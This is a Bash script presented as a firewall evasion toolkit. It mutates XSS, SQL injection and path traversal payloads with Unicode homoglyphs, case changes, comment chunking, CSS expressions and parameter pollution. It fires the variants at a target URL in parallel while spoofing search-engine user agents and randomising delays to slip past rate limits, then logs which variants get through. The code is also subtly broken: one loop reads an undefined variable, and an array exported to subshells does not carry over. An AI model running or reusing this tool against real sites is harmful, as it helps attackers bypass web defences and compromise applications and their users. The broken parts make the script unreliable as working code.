#!/bin/bash

# WAFBypasser.sh - Advanced Firewall Evasion Toolkit
# Enhanced version maintaining original structure
# Usage: ./WAFBypasser.sh -u "http://example.com/search?q=%%PAYLOAD%%&cat=news" -p "<script>alert(1)</script>" -t unicode

# Bash strict mode
set -euo pipefail
IFS=$'\n\t'

# --- Configuration ---
# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# User Agents to rotate (expanded list)
USER_AGENTS=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
    "Googlebot/2.1 (+http://www.google.com/bot.html)"
    "curl/7.79.1"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
)

# Connection timeout in seconds (increased for reliability)
TIMEOUT=15
# Parallel threads (auto-detected if not set)
THREADS=${THREADS:-$(nproc 2>/dev/null || sysctl -n hw.ncpu 2>/dev/null || echo 8)}
# Rate limit delay between requests (seconds)
MIN_DELAY=0.1
MAX_DELAY=1.5

# Enhanced Unicode transformation map
declare -A UNICODE_MAP=(
    ["a"]="а ɑ à â ä æ ã å ā ą α"
    ["A"]="А Α À Â Ä Æ Ã Å Ā Ą"
    ["s"]="ś ŝ ş š ſ ß ș"
    ["S"]="Ś Ŝ Ş Š Ș"
    ["1"]="𝟙 𝟣 𝟷 ¹ ⓵ ① ₁ 1"
    ["<"]="‹ ᐸ ❮ « ﹤ ≪"
    [">"]="› ᐳ ❯ » ﹥ ≫"
    ["("]="（ ﹙ ﹝ ⟮ ❨"
    [")"]="） ﹚ ﹞ ⟯ ❩"
    ["'"]="` ´ ʹ ʻ ʼ ‘ ’"
    ["\""]="“ ” „ ‟ ″ ＂"
    ["/"]="⁄ ∕ ⧸ ⫻"
    ["\\"]="⧵ ⧹ ∖"
    ["script"]="scriрt script sсript scrıpt scrіpt scriрt ₛcrᵢpt"
    ["alert"]="аlert alert ɑlert a1ert alｅrt"
)

# WAF blocked codes (expanded list)
DEFAULT_BLOCKED_CODES="400,403,406,412,418,429,999"

# --- Helper Functions ---
# Display usage information (enhanced with examples)
usage() {
    echo -e "${GREEN}WAFBypasser.sh - Advanced Firewall Evasion Toolkit${NC}"
    echo -e "Version: 2.1 | Author: occupyashanti"
    echo -e "\n${YELLOW}Usage:${NC}"
    echo "  $0 -u URL_TEMPLATE -p PAYLOAD [-t TECHNIQUE] [-o OUTPUT_FILE] [-c BLOCKED_CODES]"
    echo -e "\n${YELLOW}Examples:${NC}"
    echo "  # Basic test with all techniques"
    echo "  $0 -u \"http://example.com/search?q=%%PAYLOAD%%\" -p \"<script>alert(1)</script>\""
    echo -e "\n  # Targeted Unicode attack only"
    echo "  $0 -u \"http://api.example.com/v1/query=%%PAYLOAD%%\" -p \"1' OR 1=1--\" -t unicode"
    echo -e "\n  # With custom blocked codes and output file"
    echo "  $0 -u \"http://example.com\" -p \"../../etc/passwd\" -c \"403,405,500\" -o results.txt"
    exit 1
}

# Enhanced URL encoding with proper handling of all special chars
urlencode() {
    local string="${1}"
    local strlen=${#string}
    local encoded=""
    local pos char_hex

    for (( pos=0 ; pos<strlen ; pos++ )); do
        char="${string:$pos:1}"
        case "$char" in
            [-_.~a-zA-Z0-9]) encoded+="${char}" ;;
            *) printf -v char_hex '%%%02x' "'$char"
               encoded+="${char_hex}" ;;
        esac
    done
    echo "${encoded}"
}

# Check for required command-line tools (expanded checks)
check_dependencies() {
    local missing_deps=0
    local required_commands=("curl" "perl" "awk" "xargs" "tr" "cut" "sort" "uniq")
    
    for cmd in "${required_commands[@]}"; do
        if ! command -v "$cmd" &> /dev/null; then
            echo -e "${RED}[ERROR] Missing dependency: $cmd${NC}" >&2
            missing_deps=1
        fi
    done

    # Check for Bash version (for associative arrays and mapfile)
    if (( BASH_VERSINFO[0] < 4 )); then
        echo -e "${RED}[ERROR] Bash version 4.0 or higher is required${NC}" >&2
        missing_deps=1
    fi

    [[ "$missing_deps" -eq 1 ]] && exit 1
}

# --- Attack Vector Generation Functions ---
# Enhanced Unicode attack with chunking and HTML/CSS obfuscation
unicode_attack() {
    local payload="$1"
    local original_payload="$payload"
    
    # 1. Original payload
    echo "$payload"
    
    # 2. Single character substitutions
    for (( i=0; i<${#payload}; i++ )); do
        char="${payload:$pos:1}"
        if [[ -v UNICODE_MAP["$char"] ]]; then
            for variant in ${UNICODE_MAP["$char"]}; do
                echo "${payload:0:$i}$variant${payload:$((i+1))}"
            done
        fi
    done
    
    # 3. Multi-character keyword substitutions
    for keyword in "${!UNICODE_MAP[@]}"; do
        if [[ "${#keyword}" -gt 1 && "$payload" == *"$keyword"* ]]; then
            for variant in ${UNICODE_MAP["$keyword"]}; do
                echo "${payload//$keyword/$variant}"
            done
        fi
    done
    
    # 4. Chunked payload variants
    echo "${payload:0:2}/*${RANDOM}*/${payload:2}"
    echo "${payload:0:1}<!---->${payload:1}"
    
    # 5. HTML/CSS obfuscation
    echo "<style>#x{background:url('javascript:$payload')}</style>"
    echo "<div style=\"x:expression($payload)\">"
}

# Enhanced parameter pollution with additional techniques
pollution_attack() {
    local base_url_with_params="$1"
    local pollution_payload="$2"
    local base_url="${base_url_with_params%%\?*}"
    local query_string="${base_url_with_params#*\?}"
    
    [[ -z "$query_string" ]] && return
    
    local first_param=$(echo "$query_string" | awk -F'[=&]' '{print $1}')
    local last_param=$(echo "$query_string" | awk -F'[=&]' '{print $(NF-1)}')
    
    # Standard techniques
    echo "$base_url_with_params&$first_param=$pollution_payload"
    echo "$base_url_with_params&${first_param}[]=$pollution_payload"
    echo "$base_url_with_params&$(echo "$first_param" | tr 'a-z' 'A-Z')=$pollution_payload"
    
    # Advanced techniques
    echo "$base_url?$first_param=$pollution_payload&${query_string}"
    echo "$base_url?${query_string//&/$pollution_payload&}"
    echo "$base_url?$first_param=${pollution_payload}%26$query_string"
}

# Enhanced case variation with more patterns
case_attack() {
    local payload="$1"
    echo "$payload" # Original
    echo "$payload" | tr '[:upper:]' '[:lower:]' # lowercase
    echo "$payload" | tr '[:lower:]' '[:upper:]' # UPPERCASE
    echo "$payload" | perl -pe 's/([a-zA-Z])/rand() > 0.5 ? uc($1) : lc($1)/ge' # RaNdOM
    echo "$payload" | awk '{for(i=1;i<=NF;i++) $i=toupper(substr($i,1,1)) substr($i,2)}1' # Title Case
    echo "$payload" | sed -E 's/([A-Z])/-\1/g' | tr '-' '_' # snake_case
}

# --- Request Sending Function ---
send_request() {
    local url_to_test="$1"
    local user_agent="${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}"
    local delay=$(awk -v min=$MIN_DELAY -v max=$MAX_DELAY 'BEGIN{srand(); print min+rand()*(max-min)}')
    
    sleep "$delay"
    
    local response_info http_code content_size
    response_info=$(curl -s -L -A "$user_agent" \
        -w "\nHTTP_CODE:%{http_code}\nSIZE_DOWNLOAD:%{size_download}" \
        -o /dev/null --max-time "$TIMEOUT" "$url_to_test" 2>/dev/null || true)
    
    http_code=$(echo "$response_info" | grep "HTTP_CODE:" | cut -d':' -f2)
    content_size=$(echo "$response_info" | grep "SIZE_DOWNLOAD:" | cut -d':' -f2)
    
    local is_blocked=0
    for code in "${BLOCKED_STATUS_CODES_ARRAY[@]}"; do
        [[ "$http_code" == "$code" ]] && { is_blocked=1; break; }
    done
    
    if [[ "$is_blocked" -eq 0 ]]; then
        echo -e "${GREEN}[+] Bypass:${NC} $url_to_test (HTTP $http_code, Size: ${content_size:-0})" >&2
        echo "$url_to_test"
    else
        echo -e "${RED}[-] Blocked:${NC} $url_to_test (HTTP $http_code)" >&2
    fi
}
export -f send_request

# --- Main Logic ---
main() {
    check_dependencies
    
    local url_template payload_to_inject technique="all"
    local output_file="waf_bypass_results.txt"
    local blocked_codes_str="$DEFAULT_BLOCKED_CODES"
    
    while getopts "u:p:t:o:c:h" opt; do
        case $opt in
            u) url_template="$OPTARG" ;;
            p) payload_to_inject="$OPTARG" ;;
            t) technique="$OPTARG" ;;
            o) output_file="$OPTARG" ;;
            c) blocked_codes_str="$OPTARG" ;;
            h) usage ;;
            *) usage ;;
        esac
    done
    
    [[ -z "$url_template" || -z "$payload_to_inject" ]] && usage
    [[ "$url_template" != *"%%PAYLOAD%%"* ]] && {
        echo -e "${RED}[ERROR] URL template must contain %%PAYLOAD%%${NC}" >&2
        usage
    }
    
    IFS=',' read -r -a BLOCKED_STATUS_CODES_ARRAY <<< "$blocked_codes_str"
    export BLOCKED_STATUS_CODES_ARRAY
    
    echo -e "${BLUE}[*] Starting WAF bypass attempts...${NC}" >&2
    echo -e "Target: $url_template" >&2
    echo -e "Payload: $payload_to_inject" >&2
    echo -e "Technique: $technique" >&2
    echo -e "Threads: $THREADS" >&2
    echo -e "Blocked codes: ${BLOCKED_STATUS_CODES_ARRAY[*]}" >&2
    
    declare -a urls_to_test
    local encoded_payload=$(urlencode "$payload_to_inject")
    
    # Generate test URLs
    if [[ "$technique" == "unicode" || "$technique" == "all" ]]; then
        mapfile -t variants < <(unicode_attack "$payload_to_inject")
        for variant in "${variants[@]}"; do
            urls_to_test+=("${url_template//%%PAYLOAD%%/$(urlencode "$variant")}")
        done
    fi
    
    if [[ "$technique" == "case" || "$technique" == "all" ]]; then
        mapfile -t variants < <(case_attack "$payload_to_inject")
        for variant in "${variants[@]}"; do
            urls_to_test+=("${url_template//%%PAYLOAD%%/$(urlencode "$variant")}")
        done
    fi
    
    if [[ "$technique" == "pollution" || "$technique" == "all" ]]; then
        local base_url="${url_template//%%PAYLOAD%%/$encoded_payload}"
        mapfile -t variants < <(pollution_attack "$base_url" "$encoded_payload")
        urls_to_test+=("${variants[@]}")
    fi
    
    # Deduplicate and test URLs
    mapfile -t unique_urls < <(printf "%s\n" "${urls_to_test[@]}" | sort -u)
    echo -e "${BLUE}[*] Testing ${#unique_urls[@]} unique URLs...${NC}" >&2
    
    printf "%s\n" "${unique_urls[@]}" | \
        xargs -P "$THREADS" -I {} bash -c 'send_request "$@"' _ {} > "$output_file"
    
    # Results summary
    local success_count=$(wc -l < "$output_file" 2>/dev/null || echo 0)
    echo -e "\n${GREEN}[+] Scan completed. ${success_count} potential bypasses found.${NC}" >&2
    [[ "$success_count" -gt 0 ]] && {
        echo -e "${GREEN}Results saved to: $output_file${NC}" >&2
        cat "$output_file"
    }
}

main "$@"